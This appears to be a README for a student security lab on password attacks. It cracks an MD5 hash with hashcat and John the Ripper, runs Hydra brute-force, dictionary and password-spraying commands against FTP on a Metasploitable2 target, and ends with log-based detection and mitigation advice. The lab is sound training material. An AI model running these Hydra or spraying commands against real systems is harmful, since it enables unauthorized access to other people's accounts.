# 🔐 Password Attacks & Hash Cracking Lab

## 📌 Overview

This lab demonstrates practical password attack techniques using both **offline** and **online** methods. It covers hash cracking, brute-force attacks, password spraying, and detection from a defender’s perspective.

---

## 🎯 Objectives

* Understand different password attack techniques
* Perform offline hash cracking using industry tools
* Conduct online brute-force and spraying attacks
* Analyze logs to detect attacks
* Compare attack effectiveness and detection

---

## 🧰 Tools Used

* Hashcat
* John the Ripper
* Hydra
* Nmap
* hashid

---

## 🖥️ Lab Setup

| Machine         | Role     |
| --------------- | -------- |
| Kali Linux      | Attacker |
| Metasploitable2 | Target   |

---

# 🔐 Part 1: Hash Cracking (Offline)

## 🔹 Step 1: Generate Hash

```bash
echo -n "password" | md5sum
```

## 🔹 Step 2: Identify Hash

```bash
hashid hash.txt
```

---

## 🚀 Hashcat Attack

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### ✅ Result

* Cracked Password: **password**
* Attack Type: Dictionary

---

## 🔧 John the Ripper

```bash
john hash.txt
john --show hash.txt
```

### ✅ Result

* Password recovered successfully
* Auto-detected hash format

---

# 🌐 Part 2: Hydra Attack (Online)

## 🔍 Step 1: Discover Target

```bash
nmap -sn 192.168.56.0/24
```

## 🔎 Step 2: Scan Services

```bash
nmap <target-ip>
```

### Open Ports:

* FTP (21)
* SSH (22)
* Telnet (23)

---

## ⚔️ Brute Force Attack

```bash
hydra -l msfadmin -p msfadmin ftp://<target-ip>
```

### ✅ Result

* Credentials Found: **msfadmin / msfadmin**

---

## 📂 Dictionary Attack

```bash
hydra -l msfadmin -P small.txt ftp://<target-ip>
```

### Observation

* Faster than full wordlist
* More practical

---

## 🎯 Password Spraying

```bash
hydra -L users.txt -p msfadmin ftp://<target-ip>
```

### Observation

* One password across many users
* Lower detection risk

---

# 🛡️ Defender’s Perspective

## 🔍 Log Analysis

```bash
cat /var/log/auth.log
```

---

## 🚨 Brute Force Pattern

* Same user targeted repeatedly
* Example:

```
Failed login for msfadmin
(repeated multiple times)
```

---

## 🚨 Password Spraying Pattern

* Same password across multiple users
* Example:

```
Failed login for user1
Failed login for user2
Failed login for user3
```

---

# ⚖️ Tool Comparison

| Tool            | Type    | Speed     | Detection |
| --------------- | ------- | --------- | --------- |
| Hashcat         | Offline | Very Fast | No        |
| John the Ripper | Offline | Medium    | No        |
| Hydra           | Online  | Slow      | Yes       |

---

# 🔐 Security Recommendations

* Use strong passwords
* Implement account lockout policies
* Enable Multi-Factor Authentication (MFA)
* Monitor logs regularly
* Use Fail2Ban to block repeated attempts

---

# 🧠 Key Learnings

* Offline attacks are faster and stealthy
* Online attacks are slower and detectable
* Password spraying is more effective in real scenarios
* Weak/default credentials are a major vulnerability
* Log analysis is critical for defense

---

# 📁 Project Structure

```
password-attacks-lab/
│── hash.txt
│── small.txt
│── users.txt
│── README.md
```

---

# ✅ Conclusion

This lab provided hands-on experience with password attacks and highlighted both offensive and defensive security concepts. It emphasized the importance of strong authentication mechanisms and monitoring systems in preventing attacks.

---

# 🚀 Future Improvements

* Add screenshots of attacks
* Test with stronger hash types (bcrypt, NTLM)
* Integrate detection with SIEM tools (Splunk)
* Automate attack detection scripts
